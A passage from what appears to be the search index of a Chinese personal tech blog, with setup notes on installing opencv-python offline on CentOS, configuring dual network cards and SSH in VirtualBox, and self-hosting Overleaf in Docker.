\u7684\u5305\u4e5f\u662f\u6709\u4f9d\u8d56\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u4e5f\u4e0d\u77e5\u9053 opencv-python \u9700\u8981\u54ea\u4e9b\u5305\u3002\u8fd9\u91cc\u6bd4\u8f83\u7b80\u5355\u7684\u65b9\u5f0f\u662f\u5728\u81ea\u5df1\u7684\u7535\u8111\u4e0a\u7528 pip install opencv-python\uff0c\u8f93\u51fa\u4fe1\u606f\u4e2d\u4e0d\u4ec5\u5305\u542b\u9700\u8981\u54ea\u4e9b\u5176\u5b83\u5305\uff0c\u800c\u4e14\u8fd8\u5305\u542b\u5b83\u7684\u4e0b\u8f7d\u8def\u5f84\uff0c\u76f4\u63a5\u590d\u5236\u8def\u5f84\u5230\u6d4f\u89c8\u5668\u6253\u5f00\u5373\u53ef\u4e0b\u8f7d\u3002</p> <p>\u8fd9\u91cc\u53d1\u73b0 opencv-python \u53ea\u9700\u8981 numpy \u548c\u81ea\u5df1\u4fbf\u53ef\u3002</p> </li> <li> <p>pip install \u5bf9\u5e94\u7684 whl \u6587\u4ef6\u5373\u53ef\u3002</p> </li> </ol> <p>\u8fd9\u91cc\u7531\u4e8e\u81ea\u5df1\u7535\u8111\u4e0a\u7684 python \u4e3a 3.7.3 \u7684\u7248\u672c\uff0c\u56e0\u6b64\u627e\u5230\u7684\u5305\u4e3a</p> <pre><code>numpy-1.18.2-cp37-cp37m-manylinux1_x86_64.wh\nopencv_python-4.2.0.34-cp37-cp37m-manylinux1_x86_64.whl\n</code></pre> <p>\u4f46\u4e91\u4e3b\u673a\u4e0a\u7684 python \u4e3a 3.6.1 \u7684\u7248\u672c\uff0c\u56e0\u6b64 pipinstall \u7684\u65f6\u5019\u62a5\u4e86\u5982\u4e0b\u9519\u8bef\uff1a</p> <pre><code>[root@centos1 mpiuser]# pip3 install numpy-1.18.2-cp37-cp37m-manylinux1_x86_64.whl\npip is configured with locations that require TLS/SSL, however the ssl module in Python is not available.\nnumpy-1.18.2-cp37-cp37m-manylinux1_x86_64.whl is not a supported wheel on this platform.\npip is configured with locations that require TLS/SSL, however the ssl module in Python is not available.\nCould not fetch URL https://pypi.org/simple/pip/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/pip/ (Caused by SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\",)) - skipping\n</code></pre> <p>\u4e0a\u9762\u7684 require TLS/SSL\u53ef\u80fd\u5c31\u662f\u56e0\u4e3a\u6211\u6ca1\u6709\u6b63\u786e\u7f16\u8bd1openssl\u5bfc\u81f4\u7684\uff08\u4f46\u4e8b\u5b9e\u4e0aopenssl version \u662f\u53ef\u4ee5\u8f93\u51fa\u7684\uff0c\u4e14\u91c7\u7528\u65b9\u5f0f 2 \u540e yum install python3 \u5e94\u8be5\u4e0d\u4f1a\u6709\u95ee\u9898\u624d\u5bf9\uff09\u8fd9\u91cc\u5148\u4e0d\u7ba1\u5b83\u3002</p> <p>\u4e3b\u8981\u662f\u4e2d\u95f4\u7684<code>is not a supported wheel on this platform.</code></p> <p>\u5728\u81ea\u5df1\u7535\u8111\u4e0a\u7528 conda \u5b89\u88c5\u5176\u5b83 python \u7248\u672c\uff08\u5b89\u88c5\u5176\u5b83 python \u7248\u672c\uff0c\u5728 window \u4e0a\u53ef\u4ee5\u76f4\u63a5\u4e0b\u8f7d\u5bf9\u5e94\u7248\u672c\u5b89\u88c5\u5373\u53ef\uff0c\u4f46\u5728 linux \u4e0a\u8981\u4e48\u662f\u6dfb\u52a0\u5176\u5b83\u6e90\uff0c\u8981\u4e48\u5c31\u53ea\u6709\u6e90\u7801\u7f16\u8bd1\u5b89\u88c5\u4e86\uff0c\u8fd9\u91cc\u4f7f\u7528 conda \u662f\u53d6\u5de7\u7684\u65b9\u5f0f\uff0c\u7c7b\u4f3c\u4e8e\u6dfb\u52a0\u5176\u5b83\u6e90\uff09</p> <pre><code>conda env list #\u67e5\u770bconda\u521b\u5efa\u7684\u73af\u5883\nconda create -e py36\nconda activate py36\nconda search python #\u53ef\u4ee5\u770b\u5230\u8bb8\u591apython\u7248\u672c\nconda install python=3.6.1 #\u6307\u5b9a\u7248\u672c\n\nconda install pip #\u9ed8\u8ba4\u6ca1\u6709\u5b89\u88c5pip\npip install opencv-python #\u91c7\u7528pip\uff0c\u56e0\u4e3a\u6211\u4eec\u5c31\u662f\u60f3\u77e5\u9053opencv-python\u7684pip\u5305\u9700\u8981\u54ea\u4e9b\u4f9d\u8d56\u3002\u6b63\u5e38\u4f7f\u7528\u6700\u597d\u4f7f\u7528conda\u4ee3\u66ffpip\n</code></pre> <p>\u6700\u540e\u4e0b\u8f7d\u7684\u4fbf\u662f\u4ee5\u4e0b\u7684\u5305\u4e86\uff0c\u53ef\u4ee5\u53d1\u73b0 cp37 \u53d8\u6210\u4e86 cp36</p> <pre><code>opencv_python-4.2.0.34-cp36-cp36m-manylinux1_x86_64.wh\nnumpy-1.18.2-cp36-cp36m-manylinux1_x86_64.whl\n</code></pre> <p>\u4e0b\u9762\u662f numpy \u5b89\u88c5\u7684\u8f93\u51fa\uff0c\u53ef\u4ee5\u770b\u5230\u8fd8\u662f\u6709\u4e00\u70b9\u95ee\u9898 (Caused by SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\",)) - skipping\u3002\u4f46\u8fd8\u662f\u5b89\u88c5\u6210\u529f\u4e86\u3002</p> <pre><code>[root@centos1 mpiuser]# pip3 install numpy-1.18.2-cp36-cp36m-manylinux1_x86_64.whl\npip is configured with locations that require TLS/SSL, however the ssl module in Python is not available.\nProcessing ./numpy-1.18.2-cp36-cp36m-manylinux1_x86_64.whl\nInstalling collected packages: numpy\nSuccessfully installed numpy-1.18.2\npip is configured with locations that require TLS/SSL, however the ssl module in Python is not available.\nCould not fetch URL https://pypi.org/simple/pip/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/pip/ (Caused by SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\",)) - skipping\n</code></pre> <p>python \u8fd0\u884c\u65f6\u53c8\u62a5\u51fa\u4e00\u4e9b\u52a8\u6001\u94fe\u63a5\u5e93\u627e\u4e0d\u5230\uff08\u56e0\u8be5\u8fd8\u662f\u7f16\u8bd1 python \u65f6\uff0c\u6ca1\u5b89\u88c5\u5168\u90a3\u4e9b\u5e93\u5bfc\u81f4\u7684\uff09\uff0c\u89e3\u51b3\u540e\u4fbf\u53ef\u4ee5\u8fd0\u884c bad apple \u4e86\u3002</p> <pre><code>[root@centos1 temp]# python3 convert_video_multiprocess.py\nTraceback (most recent call last):\n  File \"convert_video_multiprocess.py\", line 1, in &lt;module&gt;\n    import cv2\n  File \"/usr/local/lib/python3.6/site-packages/cv2/__init__.py\", line 5, in &lt;module&gt;\n    from .cv2 import *\nImportError: libSM.so.6: cannot open shared object file: No such file or directory\n\u8fd8\u6709libXrender\u7b49\n</code></pre>","tags":["cloudview","bad-apple"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/09/07/2020-09-07-Virtual-Box%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1/","title":"Virtual Box \u914d\u7f6e\u53cc\u7f51\u5361","text":"<p>\u7531\u4e8e\u76ee\u524d\u5728\u7535\u8111\u4e0a\u8fd0\u884c\u4e00\u4e2a\u865a\u62df\u673a\u5df2\u7ecf\u6bd4\u8f83\u6d41\u7545\uff0c\u800c\u865a\u62df\u673a\u53c8\u6709\u7740\u771f\u673a\u65e0\u6cd5\u6bd4\u62df\u7684\u4f18\u52bf\uff0c\u5982\uff1a</p> <ul> <li>\u53ef\u4ee5\u5feb\u901f\u5730\u8fdb\u884c\u5907\u4efd\u4e0e\u8fd8\u539f\uff0c\u4e14\u5907\u4efd\u7684\u865a\u62df\u673a\u955c\u50cf\u53ef\u4ee5\u590d\u5236\u5230\u5176\u5b83\u7535\u8111\u4e0a</li> <li>\u53ef\u4ee5\u4fdd\u5b58\u865a\u62df\u673a\u5f53\u524d\u7684\u8fd0\u884c\u72b6\u6001\uff08\u5feb\u901f\u4f11\u7720\uff09\uff0c\u800c\u4e0b\u6b21\u542f\u52a8\u65f6\u6062\u590d\u8fd0\u884c\uff08\u4e14\u901f\u5ea6\u5f88\u5feb\uff09</li> </ul> <p>\u56e0\u6b64\u6211\u914d\u7f6e\u4e86\u4e00\u53f0 Ubuntu18.0 \u7684\u865a\u62df\u673a\uff0c\u5e76\u505a\u4e86\u4ee5\u4e0b\u914d\u7f6e\uff1a</p> <ul> <li>\u914d\u7f6e\u4e86 build-essential, python3, git, vim \u7b49\u5e38\u7528\u8f6f\u4ef6</li> <li>\u914d\u7f6e\u4e86 zsh\uff0c\u4ee5\u53ca\u4e00\u4e9b zsh \u7684\u63d2\u4ef6\u5982\u81ea\u52a8\u63d0\u793a\uff0c\u547d\u4ee4\u9ad8\u4eae\uff0cauto-jump</li> <li>\u914d\u7f6e\u4e86 VS Code, Chromium \u8f6f\u4ef6</li> <li>\u914d\u7f6e\u4e86 nodejs, cnpm, hexo \u7b49\uff0c\u7528\u4e8e\u7f16\u5199 hexo \u535a\u5ba2</li> <li>\u542f\u52a8 sshd\uff0c\u5e76\u914d\u7f6e\u7f51\u7edc</li> </ul> <p>\u5176\u4e2d\uff0c\u5173\u4e8e\u6700\u540e\u4e00\u70b9\u3002\u521a\u5f00\u59cb\u6211\u91c7\u7528\u4e86\u6865\u63a5\u7f51\u7edc + \u9759\u6001 ip \u7684\u65b9\u6848\u3002\u4f46\u662f\u53d1\u73b0\u5f53\u4e3b\u673a\u7f51\u7edc\u73af\u5883\u6539\u53d8\u65f6\uff0cssh \u4fbf\u8fde\u63a5\u4e0d\u4e0a\u4e86\uff0c\u4e8e\u662f\u4fbf\u6709\u4e86\u8fd9\u7bc7\u535a\u5ba2\u3002</p>","tags":["virtualbox","\u7f51\u6865"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/09/07/2020-09-07-Virtual-Box%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1/#\u57fa\u672c\u77e5\u8bc6","title":"\u57fa\u672c\u77e5\u8bc6","text":"<p>\u865a\u62df\u673a\u914d\u7f6e\u7f51\u7edc\u6709\u4e09\u79cd\u65b9\u5f0f\uff1a</p> <ol> <li>NAT</li> <li>\u6865\u63a5\u6a21\u5f0f</li> <li>Host-Only</li> </ol> <p>\u91c7\u7528 NAT \u65b9\u5f0f\u65f6\uff0c\u865a\u62df\u673a\u548c\u4e3b\u673a\u4f4d\u4e8e\u4e0d\u540c\u7684\u7f51\u6bb5\uff0c\u4e3b\u673a\u4f1a\u8fd0\u884c NAT \u7a0b\u5e8f\uff0c\u865a\u62df\u673a\u901a\u8fc7\u4e3b\u673a\u8bbf\u95ee\u5916\u7f51\u3002\u56e0\u6b64\u548c\u4e3b\u673a\u4f4d\u4e8e\u540c\u4e00\u4e2a\u5c40\u57df\u7f51\u7edc\u7684\u5176\u5b83\u4e3b\u673a\u65e0\u6cd5\u76f4\u63a5\u8bbf\u95ee\u865a\u62df\u673a\uff08\u4e0d\u5728\u540c\u4e00\u7f51\u6bb5\uff09\uff0c\u82e5\u8981\u8bbf\u95ee\uff0c\u5219\u9700\u8981\u5728\u4e3b\u673a\u4e0a\u8bbe\u7f6e\u7aef\u53e3\u8f6c\u53d1\u3002</p> <p>\u91c7\u7528\u6865\u63a5\u6a21\u5f0f\u65f6\uff0c\u865a\u62df\u673a\u548c\u4e3b\u673a\u4f4d\u4e8e\u76f8\u540c\u7684\u7f51\u6bb5\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u5916\u7f51\u3002\u4e14\u548c\u4e3b\u673a\u4f4d\u4e8e\u540c\u4e00\u5c40\u57df\u7f51\u7684\u5176\u5b83\u4e3b\u673a\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u865a\u62df\u673a\u3002\u4f46\u5982\u679c\u4e3b\u673a\u5207\u6362\u4e86\u7f51\u7edc\uff0c\u5219\u865a\u62df\u673a\u7684 ip \u4e5f\u4f1a\u53d1\u751f\u53d8\u5316\u3002</p> <p>Host-Only \u548c NAT \u6a21\u5f0f\u7c7b\u4f3c\uff0c\u53ea\u662f\u4e3b\u673a\u4e0d\u8bbe\u7f6e\u7aef\u53e3\u8f6c\u53d1\uff0c\u56e0\u6b64\u66f4\u52a0\u5b89\u5168\u3002</p>","tags":["virtualbox","\u7f51\u6865"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/09/07/2020-09-07-Virtual-Box%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1/#\u89e3\u51b3\u65b9\u6cd5","title":"\u89e3\u51b3\u65b9\u6cd5","text":"<p>\u4e3a\u4e86\u540c\u65f6\u62e5\u6709 NAT \u6a21\u5f0f\u548c\u6865\u63a5\u6a21\u5f0f\u7684\u4f18\u70b9\uff0c\u53ef\u4ee5\u4e3a\u865a\u62df\u673a\u8bbe\u7f6e\u4e24\u5f20\u7f51\u5361\u3002</p> <p>\u5728 VB \u4e2d\u8bbe\u7f6e\u865a\u62df\u673a\u7684\u7f51\u7edc\uff08\u9700\u8981\u865a\u62df\u673a\u5173\u673a\uff09</p> <p></p> <p></p> <p>ifconfig \u67e5\u770b\u7f51\u5361\u8bbe\u7f6e</p> <p></p> <p>\u5176\u4e2d enp0s3 \u4e3a\u6865\u63a5\u7f51\u5361\uff0cenp0s8 \u4e3a NAT \u7f51\u5361</p> <p>\u914d\u7f6e\u7f51\u5361 2 \u7684\u7aef\u53e3\u8f6c\u53d1</p> <p></p> <p>\u5176\u4e2d\u865a\u62df\u673a ip \u4e3a 10.0.3.15\uff0csshd \u5f00\u542f\u7684\u7aef\u53e3\u4e3a 22</p> <p>\u4e8e\u662f\u4fbf\u53ef\u4ee5\u901a\u8fc7\u4e3b\u673a\u7684 2333 \u7aef\u53e3 ssh \u8fde\u63a5\u5230\u865a\u62df\u673a\u4e86</p> <pre><code>ssh user@127.0.0.1 -p 2333\n</code></pre>","tags":["virtualbox","\u7f51\u6865"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/09/07/2020-09-07-Virtual-Box%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1/#ssh-\u767b\u5f55","title":"ssh \u767b\u5f55","text":"<p>\u4e3a\u4e86\u5728\u767b\u5f55\u65f6\u4e0d\u7528\u8f93\u5165\u5bc6\u7801\uff0c\u53ef\u4ee5\u4f7f\u7528 ssh-key \u767b\u5f55</p> <ol> <li> <p>\u5728\u4e3b\u673a\u4e0a\u751f\u6210 ssh key</p> <pre><code>ssh-keygen\n</code></pre> <p>\u4f1a\u5728~/.ssh \u4e0b\u751f\u6210\u516c\u94a5\u548c\u79c1\u94a5<code>id_rsa.pub, id_rsa</code></p> </li> <li> <p>\u5c06\u516c\u94a5\u590d\u5236\u5230\u865a\u62df\u673a\u7684<code>~/.ssh/authorized_keys</code>\u4e2d\uff0c\u6216\u4f7f\u7528<code>ssh-copy-id</code>\u547d\u4ee4</p> <pre><code>\u279c  ~ ssh-copy-id -h              \nUsage: /usr/bin/ssh-copy-id [-h|-?|-f|-n] [-i [identity_file]] [-p port] [[-o &lt;ssh -o options&gt;] ...] [user@]hostname\n -f: force mode -- copy keys without trying to check if they are already installed\n -n: dry run    -- no keys are actually copied\n -h|-?: print this help\n</code></pre> <p>\u6b64\u65f6\u518d ssh \u5df2\u7ecf\u4e0d\u7528\u8f93\u5165\u5bc6\u7801\u4e86</p> </li> <li> <p>VS Code \u7684 Remote-SSH \u6269\u5c55     \u4f7f\u7528 VS Code \u7684 Remote-SSH \u8fde\u63a5\u5230\u865a\u62df\u673a\uff0c\u53ef\u4ee5\u907f\u514d\u76f4\u63a5\u5728\u865a\u62df\u673a\u4e0a\u8fd0\u884c VS Code \u5361\u6162\u7684\u95ee\u9898\u3002     \u4e14 VS Code \u63d0\u4f9b\u7684\u56fe\u5f62\u5316\u76ee\u5f55\u4e5f\u66f4\u52a0\u76f4\u89c2\uff0c\u5e76\u4e14\u53ef\u4ee5\u5c06\u4e3b\u673a\u4e0a\u7684\u6587\u4ef6\u76f4\u63a5\u62d6\u62fd\u8fdb\u865a\u62df\u673a</p> <p>\u914d\u7f6e\u4e3b\u673a\u4e0a\u7684~/.ssh/config\uff08\u901a\u8fc7\u6269\u5c55\u53ef\u4ee5\u76f4\u63a5\u9009\u62e9\uff09</p> <pre><code>Host VM-Ubuntu18.0\n  HostName 127.0.0.1\n  Port 2333\n  User rain\n  IdentityFile ~/.ssh/id_rsa\n</code></pre> <p>\u8fd9\u6837\u4e00\u6765\uff0cVS Code Remote Explorer \u4fbf\u4f1a\u663e\u793a\u8fdc\u7a0b\u7684\u865a\u62df\u673a\uff08\u4e5f\u53ef\u4ee5\u901a\u8fc7<code>ssh rain@VM-Ubuntu18.0</code>\u547d\u4ee4\u884c\u8fdb\u884c ssh \u8fde\u63a5\uff09</p> </li> </ol>","tags":["virtualbox","\u7f51\u6865"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/09/07/2020-09-07-Virtual-Box%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1/#\u5173\u4e8e\u914d\u7f6e\u9759\u6001-ip","title":"\u5173\u4e8e\u914d\u7f6e\u9759\u6001 ip","text":"<p>ubuntu \u91c7\u7528 netplan \u914d\u7f6e\u7f51\u7edc</p> <pre><code>\u279c  ~ cat /etc/netplan/01-network-manager-all.yaml                     \n# Let NetworkManager manage all devices on this system\nnetwork:\n  version: 2\n  renderer: NetworkManager\n  ethernets:\n    enp0s3:\n      dhcp4: false\n      addresses:\n      - 192.168.1.233/24\n      gateway4: 192.168.1.1\n      nameservers:\n              addresses: [223.5.5.5, 223.6.6.6]\n</code></pre>","tags":["virtualbox","\u7f51\u6865"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/","title":"\u5728\u865a\u62df\u673a\u4e0a\u642d\u5efa overleaf","text":"<ul> <li>\u6982\u8ff0</li> <li>docker \u5b89\u88c5 (outdated)</li> <li>overleaf \u5b89\u88c5</li> <li>overleaf \u5b89\u88c5\u7f3a\u5931\u7684 package</li> <li>\u4f7f\u7528 wsl2 \u642d\u5efa<ul> <li>\u5b89\u88c5 wsl2</li> <li>\u5b89\u88c5 Docker Desktop<ul> <li>\u914d\u7f6e\u6e90</li> </ul> </li> <li>\u5b89\u88c5 overleaf</li> </ul> </li> <li>\u53c2\u8003</li> </ul>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#\u6982\u8ff0","title":"\u6982\u8ff0","text":"<p>\u56e0\u4e3a\u5b66\u6821\u7684 overleaf \u65e0\u6cd5\u901a\u8fc7 latex \u4ee3\u7801\u5b9a\u4f4d\u5230 pdf \u4f4d\u7f6e\u3002\u56e0\u6b64\u60f3\u5728\u672c\u5730\u642d\u5efa\u4e00\u4e2a latex \u73af\u5883\uff0c\u800c\u5982\u679c\u5728 windows \u91cc\u5b89\u88c5 texlive+ \u914d\u7f6e VS code \u6bd4\u8f83\u9ebb\u70e6\uff0c\u4e14\u4ee5\u540e\u91cd\u88c5\u7cfb\u7edf\u53c8\u65e0\u6cd5\u4fdd\u7559\uff0c\u56e0\u6b64\u8003\u8651\u5728 ubuntu \u865a\u62df\u673a\u91cc\u5b89\u88c5\u3002</p> <p>\u8fd9\u91cc\u8003\u8651\u540c\u6837\u642d\u5efa\u4e00\u4e2a overleaf\uff0c\u6bd5\u7adf\u5728\u4e3b\u673a\u91cc\u6253\u5f00\u6d4f\u89c8\u5668\u76f4\u63a5\u5c31\u80fd\u7528\u5c31\u5f88\u65b9\u4fbf\uff0c\u4e14\u754c\u9762\u4e5f\u66f4\u7f8e\u89c2\u3002</p> <p>\u66f4\u65b0</p> <p>\u5728 virtualbox \u865a\u62df\u673a\u642d\u5efa\u540e\u53d1\u73b0\u5b58\u5728\u6027\u80fd\u95ee\u9898\u3002\u4ee5\u7f16\u8bd1\u8ba1\u7ec4\u6307\u5bfc\u4e66\u4e3a\u4f8b\uff0c\u6bcf\u6b21\u4fee\u6539\u7f16\u8bd1\u9700\u8981 1 \u5206\u949f\uff0c\u5e76\u4e14\u7ecf\u5e38\u51fa\u73b0\u7f16\u8bd1 2-3 \u5206\u949f\u7136\u540e\u5931\u8d25\u7684\u60c5\u51b5\u3002</p> <p>\u5728\u67e5\u9605 wsl \u6027\u80fd\u6bd4\u8f83\u540e\uff0c\u53d1\u73b0 wsl2 \u7684\u6027\u80fd\u5df2\u7ecf\u6bd4\u8f83\u597d\u4e86\uff0c\u6709\u4e9b\u573a\u5408\u63a5\u8fd1\u539f\u751f linux \u7684\u6027\u80fd\u3002\u53c2\u8003Windows 10 May 2020 Performance For WSL vs. WSL2</p> <p>\u4e8e\u662f\u8865\u5145\u4e86\u5728 wsl2 \u4e0a\u642d\u5efa\u7684\u5185\u5bb9\u3002</p>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#docker-\u5b89\u88c5-outdated","title":"docker \u5b89\u88c5 (outdated)","text":"<p>\u65b9\u6cd5\u8fc7\u65f6\u4e86\uff0c\u4fdd\u7559\u4ec5\u7528\u4e8e\u5f52\u6863</p> <p>overleaf \u91c7\u7528\u4e86 docker \u8fdb\u884c\u90e8\u7f72\uff0c\u56e0\u6b64\u9700\u8981\u5148\u5b89\u88c5 docker\u3002</p> <ol> <li> <p>\u5b89\u88c5 docker</p> <p>\u4f7f\u7528 sh \u811a\u672c\u4e00\u952e\u5b89\u88c5\uff0c\u53c2\u8003DaoCloud</p> <p>\u975e root \u7528\u6237\u8fd8\u9700\u8981\u6dfb\u52a0\u5230 docker \u7ec4</p> <pre><code>```bash\n</code></pre> <p>sudo usermod -aG docker your-user     ```</p> </li> <li> <p>\u5b89\u88c5 docker compose</p> <p>\u4f7f\u7528 sh \u811a\u672c\u4e00\u952e\u5b89\u88c5\uff0c\u53c2\u8003DaoCloud</p> </li> <li> <p>docker \u955c\u50cf\u52a0\u901f</p> </li> </ol> <pre><code>sudo mkdir -p /etc/docker\nsudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'\n{\n \"registry-mirrors\": [\"https://&lt;your-key&gt;.mirror.aliyuncs.com\"]\n}\nEOF\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n</code></pre> <p>\u53c2\u8003\u963f\u91cc\u4e91\u5bb9\u5668\u955c\u50cf\u670d\u52a1</p>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#overleaf-\u5b89\u88c5","title":"overleaf \u5b89\u88c5","text":"<p>\u53c2\u8003overleaf:toolkit\uff0c\u4e3b\u8981\u662f\u4f7f\u7528\u4e86 docker compose \u81ea\u52a8\u5b89\u88c5\u7ba1\u7406\u591a\u4e2a\u5bb9\u5668\u3002</p>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#overleaf-\u5b89\u88c5\u7f3a\u5931\u7684-package","title":"overleaf \u5b89\u88c5\u7f3a\u5931\u7684 package","text":"<p>\u521a\u5b89\u88c5\u597d\u7684 overleaf \u7f3a\u5c11\u4e86 ctex \u7b49\u5f88\u591a\u5305\uff0c\u76f4\u63a5\u7f16\u8bd1\u8ba1\u7ec4\u6307\u5bfc\u4e66\u4f1a\u63d0\u793a\u7f3a\u5c11**.sty \u6587\u4ef6\uff0c\u6240\u4ee5\u9700\u8981\u624b\u52a8\u5b89\u88c5\u5305\u3002</p> <p>overleaf \u5e95\u5c42\u7684 tex \u7f16\u8bd1\u5668\u91c7\u7528\u7684\u662f texlive \u53d1\u884c\u7248\uff0c\u91c7\u7528 tlmgr \u7ba1\u7406\u5305\u3002</p> <ol> <li> <p>\u67e5\u770b docker \u5bb9\u5668</p> <pre><code>\u279c  ~ sudo docker ps \nCONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS                    PORTS                NAMES\n046949b8197a        sharelatex/sharelatex:2.4.1   \"/sbin/my_init\"          21 hours ago        Up 12 minutes             0.0.0.0:80-&gt;80/tcp   sharelatex\n0076877c7906        mongo:3.6                     \"docker-entrypoint.s\u2026\"   21 hours ago        Up 12 minutes (healthy)   27017/tcp            mongo\n755cc370c29b        redis:5.0                     \"docker-entrypoint.s\u2026\"   21 hours ago        Up 12 minutes             6379/tcp             redis\n</code></pre> <p>\u5176\u4e2d sharelatex \u4e3a overleaf \u5e94\u7528\uff0c\u53e6\u5916\u4e24\u4e2a\u4e3a\u6570\u636e\u5e93\u3002</p> </li> <li> <p>\u8fdb\u5165 sharelatex \u5bb9\u5668</p> </li> </ol> <pre><code>\u279c  ~ sudo docker exec -it sharelatex /bin/bash\nroot@046949b8197a:/# \n</code></pre> <ol> <li> <p>\u4f7f\u7528 tlmgr \u8f6f\u4ef6</p> <p>\u53ef\u4ee5\u901a\u8fc7<code>tlmgr install &lt;package&gt;</code>\u6765\u5b89\u88c5\u5404\u79cd\u5305\uff0c\u4f46\u662f\u6548\u7387\u592a\u4f4e\uff08\u9700\u8981\u5b89\u88c5\u51e0\u5341\u4e2a\u5305\uff09\uff0c\u56e0\u6b64\u91c7\u7528\u4e00\u4e2a\u7279\u6b8a\u7684\u5305<code>texliveonfly</code>\u6765\u81ea\u52a8\u5b89\u88c5\u9700\u8981\u7684\u5305\u3002\u53c2\u8003[1]</p> <pre><code>#\u66f4\u6362 CTAN \u6e90\u4e3a\u6e05\u534e\u6e90\uff0c\u5e2e\u52a9\uff1ahttps://mirrors.tuna.tsinghua.edu.cn/help/CTAN/\ntlmgr option repository https://mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/tlnet\n\ntlmgr update --self\ntlmgr install texliveonfly\n</code></pre> </li> <li> <p>\u4f7f\u7528 texliveonfly \u81ea\u52a8\u5b89\u88c5\u5305</p> <pre><code>#\u627e\u5230 overleaf \u4e2d\u9700\u8981\u7f16\u8bd1\u7684 tex \u6587\u4ef6\nroot@046949b8197a:/# find /var -name elegantbook-cn.tex\n/var/lib/sharelatex/data/compiles/5f805cb6723b610077ad52ad-5f805b95723b610077ad52a4/elegantbook-cn.tex\n/var/lib/sharelatex/data/compiles/5f817d1ba9660e0077353294-5f805b95723b610077ad52a4/elegantbook-cn.tex\n\n# \u5207\u6362\u5230\u8be5\u76ee\u5f55\u540e\ntexliveonfly elegantbook-cn.tex #\u9ed8\u8ba4\u4f7f\u7528 pdflatex\n... #\u7701\u7565\u8f93\u51fa\ntexliveonfly elegantbook-cn.tex -c xelatex #\u6307\u5b9a\u4f7f\u7528 xelatex \u7f16\u8bd1\u5668\n</code></pre> </li> </ol>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#\u4f7f\u7528-wsl2-\u642d\u5efa","title":"\u4f7f\u7528 wsl2 \u642d\u5efa","text":"","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#\u5b89\u88c5-wsl2","title":"\u5b89\u88c5 wsl2","text":"<p>\u53c2\u8003[2]</p>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#\u5b89\u88c5-docker-desktop","title":"\u5b89\u88c5 Docker Desktop","text":"<p>\u53c2\u8003[3]</p>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#\u914d\u7f6e\u6e90","title":"\u914d\u7f6e\u6e90","text":"<p>setting-&gt;docker engine\uff0c\u540c\u6837\u662f\u7f16\u8f91 daemon.json\uff0c\u5728 registry-mirrors 